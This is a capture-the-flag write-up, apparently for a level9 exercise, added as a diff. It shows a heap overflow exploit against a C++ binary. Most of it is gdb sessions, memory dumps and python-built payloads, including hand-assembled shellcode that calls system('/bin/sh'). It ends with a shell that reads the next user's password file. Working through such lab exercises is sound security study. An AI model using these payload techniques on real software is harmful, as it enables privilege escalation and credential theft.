@@ -1,0 +1,89 @@
+# Oh well, CPP :^(
+
+# First, let's try to collect information about the overflow
+[...]
+level9@SnowCrash:~$ ./level9 $(python -c 'print "A"*109')
+Segmentation fault (core dumped)
+level9@SnowCrash:~$ ./level9 $(python -c 'print "A"*108')
+level9@SnowCrash:~$
+[...]
+
+# Ok, we can start our overflow at 108 char :)
+
+================================================================================
+
+# We can kind of overflow the operator+ function with the memcpy so when
+# The main will call classVar2.operator+(), it'll call our shellcode instead
+   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] # Here eax will be the value of our overflow
+   [...]
+   0x08048693 <+159>:	call   edx
+   [...]
+# The problem is that we must pass the address of the address of our shellcode
+# Because EAX is derefenced with [eax] then called
+
+# Let's find some useful addresses
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7ea7c58
+
+(gdb) info func system
+[...]
+0xb7d86060  system
+[...]
+
+# Let's find the address of our stack
+(gdb) disas main
+[...]
+  0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+[...]
+
+(gdb) b *0x08048677
+(gdb) r $(python -c 'print "A"*108+"\x60\x60\xd8\xb7"')
+
+Breakpoint 2, 0x0804867c in main ()
+(gdb) x/50x 0x0804a010
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a070:	0x41414141	0x41414141	0xb7d86060	0x00000000
+0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d0:	0x00000000	0x00000000
+
+(gdb) x/x 0x0804a078
+0x804a078:	0xb7d86060
+
+# Ok now we know where our stack is stored at the execution
+# Near address 0x0804a078
+
+================================================================================
+
+# Let's try to call a function to test our exploit
+
+(gdb) b system
+Breakpoint 3 at 0xb7d86060
+
+(gdb) r $(python -c 'print "A"*104+"\x60\x60\xd8\xb7"+"\x74\xa0\x04\x08"')
+Breakpoint 3, 0xb7d86060 in system () from /lib/i386-linux-gnu/libc.so.6
+
+# Nice, our function is called, we can now build our chain
+
+The shellcode will be:
+                     2----------------------------------------------------------------------------------------1
+                    |                                                                                         |
+                    call----------------------3---------------4---------------5
+    GARBAGE -> ADDRESS OF OUR SHELLCODE -> PUSH /bin/sh -> PUSH /bin/sh -> PUSH system; RET -> ADDRESS OF ADDRESS OF OUR SHELLCODE
+                    |                        ^
+                    |                        |
+                    --------------------------
+
+level9@SnowCrash:~$ ./level9 $(python -c 'print "A"*88+"\x68\xa0\x04\x08"+"\x68\x58\x7c\xea\xB7"+"\x68\x58\x7c\xea\xB7"+"\x68\x60\x60\xD8\xB7\xC3"+"\x64\xa0\x04\x08"')
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
